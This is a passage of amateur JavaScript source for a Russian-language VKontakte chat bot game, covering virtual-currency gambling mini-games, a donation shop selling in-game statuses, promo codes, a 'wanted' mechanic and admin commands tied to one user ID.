				if(user.balance < 1 ) return message.send(`@id${user.id}(${user.prefix}), недостаточно денег 😒\n 💰 Баланс: ${spaces(user.balance)}`)
					amount = user.balance; 
			}else{ 
				var amount = parserInt(message.$match[1]); 
			}
			if(user.ap < 3){
				if(user.balance > 1000000000000000000000) return message.send(`@id${user.id}(${user.prefix}), Ошибка.`)
					if(amount > 1000000000000000000 || amount < 1) return message.send(`@id${user.id}(${user.prefix}), ставка не может превышать более - 1.000.000.000.000.000.000`)
				}
			if(!Number(amount)) return message.send(`@id${user.id}(${user.prefix}), ставка должна быть цифрового вида.`);

			var mnojitelwin = 2
			var mnojitellose = [0.95,0.75,0.25,1].random();
			var smilelose = ['😩','😕','😦','😵','😟','😔','😩','😿'].random();
			var smilewin = ['😄','😁','😊','😃','😉','😜','😋','🤗','🙂','🙃','😌','🤤','😇','🤪','😈','😸','😼','😺','😎'].random();


			if(rand(1,100) <= 30){
				let balance = amount;
				let win_balance = amount * mnojitelwin;
				win_balance = Math.round(win_balance);
				user.balance += Number(win_balance) 
				return message.send(`@id${user.id}(${user.prefix}), вы выиграли ${spaces(win_balance)}$ (х${mnojitelwin}) ${smilewin}\n💰 Баланс: ${spaces(user.balance)}$`); 
			}else{
				let balance = amount;
				let lose_balance = amount * mnojitellose;
				lose_balance = Math.round(lose_balance);
				user.balance -= Number(lose_balance) 
				return message.send(`@id${user.id}(${user.prefix}), вы проиграли ${spaces(lose_balance)}$ (х${mnojitellose}) ${smilelose}\n💰 Баланс: ${spaces(user.balance)}$`);
			}
		});







vk.updates.hear(/^(?:вказино)\s?([^\s	].*)?/i, (message) => { 
	if(!message.$match[1]) return message.send(`🔸 ➾ укажите ставку VK COINS`);
	let amount = Number(parserInt(message.$match[1]));
	amount = Math.round(amount);  
	let id = user_id(message.user)
	let user = acc.users[user_id(message.user)];
	let text = '';
	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`);
	if (amount > acc.users[id].upis14  || amount < 1 ) return message.send(`🎉 ➾  У вас нет столько VK COINS !`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 50000000000000000000 && amount != acc.users[id].balance) return message.send(``);
	} 

	if(acc.users[id].balance > 20000000){
		if(rand(1,100) <= 30){

			user.game.kazwin += 1;
			user.upis14  -= amount;
			let sum = amount * 2; 
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.upis14  += sum;
			game_log(user_id(message.user), 'казино', amount, 1)
			
			if(amount >= 10000){

				user.exs += 2;
				let up = lvlup(id);
				if(up == true){
					return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)} VK COINS`);
				}else{
					return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)} VK COINS`);
				}
			}else{
				return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)}VK COINS\n`);
			}

		}else{
			game_log(user_id(message.user), 'казино', amount, 0)
			user.game.kazlose += 1;
			user.upis14  -= amount;
			return message.send(`❗ ➾ Вы проиграли ${amount} VK COUINS !`);
		}
	}else{	
		if(rand(1,100) <= 20){

			user.game.kazwin += 1;
			user.upis14  -= amount;
			let sum = amount * 2; 
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.upis14  += sum;
			
			if(amount >= 10000){
				game_log(user_id(message.user), 'казино', amount, 1)

				user.exs += 2;
				let up = lvlup(id);
				if(up == true){
					return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)}VK COINS\n`);
				}else{
					return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)}VK COINS\n`);
				}
			}else{
				return message.send(`${text}✅ ➾ Вы выиграли ${spaces(sum)}VK COINS\n`);
			}

		}else{
			game_log(user_id(message.user), 'казино', amount, 0)
			user.game.kazlose += 1;
			user.upis14  -= amount;
			return message.send(`❗ ➾ Вы проиграли ${amount} VK COINS !`);
		}
	}
});  

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:акция)?\s([^\s].*)?\s(.*)/i, message => {
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: акция [вверх/вниз] [ставка]`)
		let amount = parserInt(message.$match[2]);   
	let user = acc.users[user_id(message.user)]; 
	let id = user_id(message.user) 
	if (amount > acc.users[id].balance || amount < 1) return message.send(`🎉 ➾  Ставка не может превышать баланс или быть ниже 1$`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 5000005000000000050000000000) return message.send(`🎉 ➾  Ставка не должна быть больше 500.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
	}

	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`); 

	if(message.$match[1] == 'вверх'){
		if(rand(1,2) == 1){ 
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum;
			user.game.binwin += 1; 
			game_log(user_id(message.user), 'акция', amount, 1)
			if(amount < 10000){ 
				user.exs += 2;
				user.upis56456456 += 1;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}📈 ➾ Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}📈 ➾ Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}📈 ➾ Курс акций вырос на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}

		}else{ 
			game_log(user_id(message.user), 'акция', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`📈 ➾ Курс акций упал на - ${rand(1,100)}%\n🌚 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	}
	if(message.$match[1] == 'вниз'){ 
		if(rand(1,2) == 1){
			let i = games(type='вниз');
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum; 
			user.game.binwin += 1;
			game_log(user_id(message.user), 'акция', amount, 1)
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}📈 ➾ Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}📈 ➾ Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}📈 ➾ Курс акций упал на - ${rand(1,100)}%\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
			}


		}else{ 
			game_log(user_id(message.user), 'акция', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`📈 ➾ Курс акций вырос на - ${rand(1,100)}%\n🌚 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	} 
});
	///////////////////////////////////////////////////НОЖНИЦЫ////////////////////
	vk.updates.hear(/^(?:суефа)?\s([^\s].*)?\s(.*)/i, message => {
		if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: суефа [камень/ножницы/бумага] [ставка]`)
			let amount = parserInt(message.$match[2]);   
		let user = acc.users[user_id(message.user)]; 
		let id = user_id(message.user) 
		if (amount > acc.users[id].balance || amount < 1) return message.send(`🎉 ➾  Ставка не может превышать баланс или быть ниже 1$`);
		if(user.block_game == true && user.ap < 3){
			if (amount > 5000005000000000050000000000) return message.send(`🎉 ➾  Ставка не должна быть больше 500.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
		}

		if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`); 

		if(message.$match[1] == 'камень'){
			if(rand(1,2) == 1){ 
				user.balance -= amount;
				let sum = amount * 2;
				let text = ''
				if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
				if(config.bonus_exs == true) user.exs += 2;
				let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
				user.balance += sum;
				user.game.binwin += 1; 
				game_log(user_id(message.user), 'камень', amount, 1)
				if(amount < 10000){ 
					user.exs += 2;
					let up = lvlup(user_id(message.user));
					if(up == true){
						return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
					}else{
						return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
					}
				}else{
					return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
				}

			}else{ 
				game_log(user_id(message.user), 'суефа', amount, 0)
				user.game.binlose += 1;
				user.balance -= amount;
				return message.reply(`\n🌚 ➾ Вам выпала бумага и вы проиграли ${spaces(amount)}$!`);
			}
		}
		if(message.$match[1] == 'бумага'){ 
			if(rand(1,2) == 1){
				let i = games(type='бумага');
				user.balance -= amount;
				let sum = amount * 2;
				let text = ''
				if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
				if(config.bonus_exs == true) user.exs += 2;
				let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
				user.balance += sum; 
				user.game.binwin += 1;
				game_log(user_id(message.user), 'ножницы', amount, 1)
				if(amount < 10000){
					user.exs += 2;
					let up = lvlup(user_id(message.user));
					if(up == true){
						return message.reply(`${text}✂ ➾ Вам выпала бумага ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
					}else{
						return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
					}
				}else{
					return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
				}


			}else{ 
				game_log(user_id(message.user), 'суефа', amount, 0)
				user.game.binlose += 1;
				user.balance -= amount;
				return message.reply(`\n🌚 ➾ Вам выпали ножницы и вы проиграли ${spaces(amount)}$!`);

			}
		} 
		if(message.$match[1] == 'ножницы'){ 
			if(rand(1,2) == 1){
				let i = games(type='ножницы');
				user.balance -= amount;
				let sum = amount * 2;
				let text = ''
				if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
				if(config.bonus_exs == true) user.exs += 2;
				let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
				user.balance += sum; 
				user.game.binwin += 1;
				game_log(user_id(message.user), 'ножницы', amount, 1)
				if(amount < 10000){
					user.exs += 2;
					let up = lvlup(user_id(message.user));
					if(up == true){
						return message.reply(`${text}✂ ➾ Вам выпала бумага ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
					}else{
						return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
					}
				}else{
					return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
				}


			}else{ 
				game_log(user_id(message.user), 'суефа', amount, 0)
				user.game.binlose += 1;
				user.balance -= amount;
				return message.reply(`\n🌚 ➾ Вам выпал камень и вы проиграли ${spaces(amount)}$!`);

			}
		} 
	});
	////
	/////////////////МОНЕТКА////////////////////////////
	vk.updates.hear(/^(?:монетка)\s?([^]+)?\s([^\s   ].*)/i,  message => {
		if(!message.$match[1]) return message.send(`⚠ Монетка [орел/решка] [ставка]`)
			let amount = parserInt(message.$match[2]);
		amount = Math.round(amount);
		let id = user_id(message.user)
		if(!Number(amount)) return message.send(`⚠ Ставка должна быть числом!`);
		let user = acc.users[user_id(message.user)];
		if (amount > acc.users[id].balance || amount < 1) return message.send(`⚠Ставка не может превышать баланс или быть ниже 1$`);
		if(user.block_game == true && user.ap < 3){
			if (amount > 500000999999999999999999999999) return message.send(`⚠ Ставка не должна быть больше 500.000$`);
		}

		if(message.$match[1].toLowerCase() == 'орел'){
			if(rand(1,2) == 1){
				let i = "🔸 Вам попался орёл"
				user.balance += amount;
				if(config.bonus_balance == true){text += '[x2 bonus]\n'; amount = amount  * 2;}
				if(amount < 10000){
					user.exs += 2;
					let up = lvlup(user_id(message.user));
					if(up == true){
						return message.reply(`${i} \n ${text}✔ Вы выиграли ${spaces(amount)}$`);
					}else{
						return message.reply(`${i} \n${text}✔ Вы выиграли ${spaces(amount)}$`);
					}
				}else{
					return message.reply(`${i} \n${text}✔ Вы выиграли ${spaces(amount)}$`);
				}
			}else{
				let i = "🔹 Вам попалась решка"
				user.balance -= amount;
				return message.reply(`${i} \n✖ Вы проиграли ${spaces(amount)}$`);
			}
		}
		if(message.$match[1].toLowerCase() == 'решка'){
			if(rand(1,2) == 1){
				let i = "🔹 Вам попалась решка"              
				user.balance += amount ;
				if(amount < 10000){
					user.exs += 2;
					let up = lvlup(user_id(message.user));
					if(up == true){
						return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
					}else{
						return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
					}
				}else{
					return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
				}  
			}else{
				let i = "🔸 Вам попался орёл"
				user.balance -= amount;
				return message.reply(`${i} \n✖ Вы проиграли ${spaces(amount)}$`);
			}
		}
	});
	//////////////////////////////////////////////////


///

vk.updates.hear(/^(?:ставка)\s?([^]+)?\s([^\s	].*)/i,  message => {
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ставка [выше/ниже] [ставка]`)
		let amount = parserInt(message.$match[2]);   
	amount = Math.round(amount);  
	let id = user_id(message.user) 
	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`);
	let user = acc.users[user_id(message.user)]; 
	if (amount > acc.users[id].balance || amount < 1) return message.send(`🔸 ➾  Ставка не может превышать баланс или быть ниже 1$`);  
	if(user.block_game == true && user.ap < 3){
		if (amount > 5000005000000000050000000000) return message.send(`🎉 ➾  Ставка не должна быть больше 500.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
	}

	if(message.$match[1].toLowerCase() == 'выше'){
		if(rand(1,2) == 1){ 

			user.balance -= amount;
			user.balance += amount * 2;
			user.game.stavka_win += 1; 
			game_log(user_id(message.user), 'ставка', amount, 1)
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user)); 
				if(up == true){
					return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!`);
				}
			}else{
				return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			} 
		}else{ 
			game_log(user_id(message.user), 'ставка', amount, 0) 
			user.game.stavka_lose += 1;
			user.balance -= amount;
			return message.reply(`🔸 ➾ Число [${rand(1,499999)}]\n🔸 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	}
	if(message.$match[1].toLowerCase() == 'ниже'){ 
		if(rand(1,2) == 1){ 
			user.balance -= amount;
			user.balance += amount * 2;
			user.game.stavka_win += 1;  
			game_log(user_id(message.user), 'ставка', amount, 1)
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user)); 
				if(up == true){
					return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!`);
				}
			}else{
				return message.reply(`🔸 ➾ Число [${rand(1,499999)}]. Вы угадали\n🔸 ➾ Вы выиграли ${spaces(amount * 2)}$ и 2 опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}  
		}else{ 
			game_log(user_id(message.user), 'ставка', amount, 0)
			user.game.stavka_lose += 1;
			user.balance -= amount;
			return message.reply(`🔸 ➾ Число [${rand(500000,999999)}]\n🔸 ➾ Вы проиграли ${spaces(amount)}$!`);
		}
	} 
});

vk.updates.hear(/^(?:сапер)\s?([0-9]+)?\s([^\s	].*)/i, message => {
	let i = parserInt(message.$match[2]); 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !message.$match[2] || !Number(i)|| !Number(message.$match[1]) || message.$match[1] > 60 ) return message.send(`🎲 ➾ Пример ввода: 'сапер [1-60] [СТАВКА]\n🎲 ➾ [1-60] - это шанс(от него зависит сумма выплаты).'`);
	user.bloks.random_game = true
	setTimeout(() => {
		user.bloks.random_game = false
	}, 300000); 
	let p = Number(message.$match[1])
	let amount = p;
	amount = Math.round(amount);  
	if(!Number(message.$match[1])) return message.send(`🎲 ➾ Пример ввода: 'сапер [1-60] [СТАВКА]\n🎲 ➾ [1-60] - это шанс(от него зависит сумма выплаты).'`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 5000050000000000500000000000) return message.send(`🎉 ➾  Ставка не должна быть больше 500.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
	}
	if (i > user.balance || i <= 0) return message.send(`🔸 ➾  Ставка не может превышать баланс или быть отрицательной`);  
	if(p >= 40){
		if(rand(1,130) <= p){ 
			game_log(user_id(message.user), 'рандом', amount, 1)
			i = i / 100 * 30 + i 

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user));
			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта`);
			}  
		}else{ 
			game_log(user_id(message.user), 'рандом', amount, 0)
			user.game.rand_lose += 1;
			user.balance -= Number(i); 
			return message.send(`🎲 ➾ Вы проиграли [${Math.round(i)}]$`);
		} 
	} 
	if(p >= 20 && p < 40){
		if(rand(1,100) <= p){
			i = i / 100 * 20 + i 
			game_log(user_id(message.user), 'рандом', amount, 1)

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user)); 

			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И получили +2 опыта`);
			}  
		}else{
			user.balance -= Number(i); 
			game_log(user_id(message.user), 'рандом', amount, 0)  
			user.game.rand_lose += 1;
			return message.send(`🎲 ➾ Вы проиграли [${Math.round(i)}]$`);
		} 
	} 

	if(p >= 1 && p < 20){
		if(rand(1,100) <= p){
			i = i / 100 * 70 + i 
			game_log(user_id(message.user), 'рандом', amount, 1)

			user.exs += 2;
			user.game.rand_win += 1;
			let up = lvlup(user_id(message.user)); 

			user.balance += Math.round(i);
			if(up == true){
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И полочили +2 опыта\n🌟 ➾ [Уровень повышен]`);
			}else{
				return message.reply(`🎲 ➾ Вы выиграли [${Math.round(i)}]$ при шансе: ${p}%\n🎲 ➾ И полочили +2 опыта`);
			}  
		}else{
			user.balance -= Number(i); 
			game_log(user_id(message.user), 'рандом', amount, 0) 
			user.game.rand_lose += 1;
			return message.send(`🎲 ➾ Вы проиграли [${i}]$`);
		} 
	} 

	user.balance -= Number(message.$match[2]); 
	user.game.rand_lose += 1;
	return message.send(`🎲 ➾ Вы проиграли [${message.$match[1]}]$`);
});



vk.updates.hear(/^(?:лог)/i, (message) => {
	let id = user_id(message.user);

	let text = '⛔ Лог последних 15 игр ⛔\n';
	for(i=0; i!=log.game[id].log.length; i++){text += log.game[id].log[i];} 
		return message.send(text);
});
 // - -- - - - - - - -- - - - -  рубины - - - - - 
 vk.updates.hear(/^(?:!!!!!!!!!!!!!!!донат)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	return message.send(`	

 		Прочтите информацию, как пополнить свой баланс, напишите " Динфо "

 		┇💰 Ваш баланс донат рублей: ${spaces(user.opea)}

 		┇🤴 Статус " VIP "
 		┇┇Стоимость 25 донат рублей

 		┇Для покупки , напишите " buyvip "

 		▶
 		┇🍕 Статус " Донатер "
 		┇Стоимость 67 донат рублей

 		┇Для покупки , напишите " buydonater "

 		▶
 		┇💎 Статус " Администратора " 
 		┇Стоимость 50 донат рублей 

 		┇Для покупки , напишите " buyadmin "
 		▶ 
 		┇🆘Статус " Гл. Администратор " 
 		┇Стоимость 150 донат рублей 

 		┇Для покупки , напишите " buyglv "

 		▶ 
 		┇📍Статус " Основатель " 
 		┇Стоимость 230 донат рублей 

 		┇Для покупки , напишите " buyosn "

 		▶ 
 		┇✨Статус " Спец. Администратор " 
 		┇Стоимость 350 донат рублей 

 		┇Для покупки , напишите " buyspet "


 		Прочтите информацию, как пополнить свой баланс, напишите " Динфо "
 		1 рубль - 2 донат рублей 
 		▻ Чтобы посмотреть команды администратора и вип, напишите " !админка "




 		`)
 });
 vk.updates.hear(/^(?:донатер)/i,  message => {
 	let user = acc.users[user_id(message.user)];
 	return message.send(`	


 		Возможности:
 		💰 !set [сумма] ( лимит 1.000.000.000 $ в час ) 
 		👓 !pitme [название] - Выдать себе любого питомца
 		📍 aad [текст] - Админ чат




 		`)
 });
 
 
 vk.updates.hear(/^курс/i,  (message) => {  
 	return message.send(`
 		📊 ➾ Актуальный курс обмена рубинов << 📊
 		- - - - - - - -  
 		🔸 ➾ Продажа: ${acc.curs}$
 		- - - - - - - - 
 		📶 ➾ 'Трейд [COUNT]'


 		💰 ➾ Актуальный курс обмена Биткоинов << 💰
 		- - - - - - - -  
 		🔸 ➾ Продажа: ${acc.bit}$
 		- - - - - - - - 
 		📶 ➾ 'Биткоин продать [COUNT]'
 		`);
 });

 vk.updates.hear(/^(?:трейд)\s?([0-9]+)?/i,  (message) => {
 	let user = acc.users[user_id(message.user)];
 	if(!message.$match[1]) return message.send(`📝 ➾ Введите количество рубинов для обмена`);
 	if(user.donate < message.$match[1]) return message.send(`📝 ➾ У вас нет столько рубинов`);
 	user.donate -= Number(message.$match[1]);
 	user.balance += Number(message.$match[1] * acc.curs)
 	return message.send(`📝 ➾ Вы обменяли [${message.$match[1]}] рубинов на [${message.$match[1] * acc.curs}]$`);
 });

//////////////////////////////////////////////////////// промики

vk.updates.hear(/^(?:промокод)\s?([^]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(`📝 ➾ Укажите промокод`);
	if(!acc.promos[message.$match[1]]) return message.send(`📝 ➾ Такого промокода нету/либо закончились активации`);
	if(acc.promos[message.$match[1]].users[message.user]) return message.send(`📝 ➾ Вы уже активировали промокод`);
	acc.promos[message.$match[1]].users[message.user] = {i: true};
	acc.promos[message.$match[1]].activ -= 1;
	if(acc.promos[message.$match[1]].type == 1){
		user.balance += Number(acc.promos[message.$match[1]].balance); 
		message.send(`✅ ➾ Вы активировали промокод!\n✅ ➾ Вы получили: ${acc.promos[message.$match[1]].balance}$!\n 📛 ➾ Осталось активаций: ${acc.promos[message.$match[1]].activ}`);
	}
	if(acc.promos.type == 2){
		user.donate += Number(acc.promos[message.$match[1]].balance); 
		message.send(`✅ ➾ Вы активировали промокод!\n✅ ➾ Вы получили: ${acc.promos[message.$match[1]].balance} рубинов!\n 📛 ➾ Осталось активаций: ${acc.promos[message.$match[1]].activ}`);
	}

	if(acc.promos[message.$match[1]].activ == 0) delete acc.promos[message.$match[1]];
	return 
});


vk.updates.hear(/^(?:Розыск)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {
	let id = user_id(message.user);	 	 
	let i = config;
	if(acc.users[id].mysor < 2) return;

	let user = acc.users[user_id(message.user)]; 
	if(user.mysor < 2) return message.send(`🔸 >> Вы не мент 2 уровня !`);
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: розыск ID (1-6)`); 
	if(message.$match[2] > 6) return message.send(`🔸 >> Максимальный уровень розыска - 6!`)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
	acc.users[message.$match[1]].volff10 = Number(message.$match[2]);
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 4)
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `ВНИМАНИЯ ! ВЫ В РОЗЫСКЕ ! СРОЧНО СПРЯЧЬТЕСЬ ! " СПРЯТАТЬСЯ "`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Игрок теперь в розыске !`);

});
vk.updates.hear(/^(?:Ирозыск)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {
	let id = user_id(message.user);	 	 
	let i = config;
	if(acc.users[id].mysor < 2) return;

	let user = acc.users[user_id(message.user)]; 
	if(user.mysor < 2) return message.send(`🔸 >> Вы не мент 2 уровня !`);
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: ирозыск ID (1-6)`); 
	if(message.$match[2] > 6) return message.send(`🔸 >> Максимальный уровень розыска - 6!`)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
	acc.users[message.$match[1]].volff10 -= Number(message.$match[2]);
	logs(user_id(message.user), message.$match[1], message.$match[2], type = 4)
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Игрок теперь не в розыске !`);

});


 //======================================================================
 vk.updates.hear(/^(?:boostzp)\s?([0-9]+)?\s?([0-9]+)?/i,(message) => {
 	let id = user_id(message.user);	 	 
 	if(message.user != 515126478) return;
 	let user = acc.users[user_id(message.user)];  
 	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: boostzp ID LVL(1-24)`);  
 	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
 	acc.users[message.$match[1]].autozp = Number(message.$match[2]);
 	return message.send(`🔸 >> Вы выдали игроку [${acc.users[message.$match[1]].prefix}] автосбор зарплат на (${message.$match[2]}) раз `);
 });
 vk.updates.hear(/^(?:boostbiz)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
 	let id = user_id(message.user);	 	 
 	if(message.user != 515126478) return;
 	let user = acc.users[user_id(message.user)];  
 	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 >> Пример команды: boostbiz ID LVL(1-24)`);  
 	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`); 
 	acc.users[message.$match[1]].autobiz = Number(message.$match[2]);
 	return message.send(`🔸 >> Вы выдали игроку [${acc.users[message.$match[1]].prefix}] автосбор прибыли на (${message.$match[2]}) раз `);
 });
///////////////////

vk.updates.hear(/^(?:blockpay)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
	if(message.user != 515126478) return;
	let text = '';
	if(!message.$match[1] || !message.$match[2]) return;
	let id = user_id(message.user);	 	 
	if(id != 1) return;
	let user = acc.users[user_id(message.user)];    
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);  
	if(Number(message.$match[2]) == 1){
		texts = 'включил' 
		acc.users[message.$match[1]].admin.block_pay = true;
	}
	if(Number(message.$match[2]) == 0){
		texts = 'отключил' 
		acc.users[message.$match[1]].admin.block_pay = false;
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ Спец.Администратор ${texts} Вам запрет на переводы.`,random_id: 0
	}); 
	return message.send(`🔸 >> Вы ${texts}и запрет на переводы`);
});

vk.updates.hear(/^(?:blockgive)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {
	if(message.user != 515126478) return;
	let text = '';
	if(!message.$match[1] || !message.$match[2]) return;
	let id = user_id(message.user);	 	
	let i = config;
	if(id != 1) return;
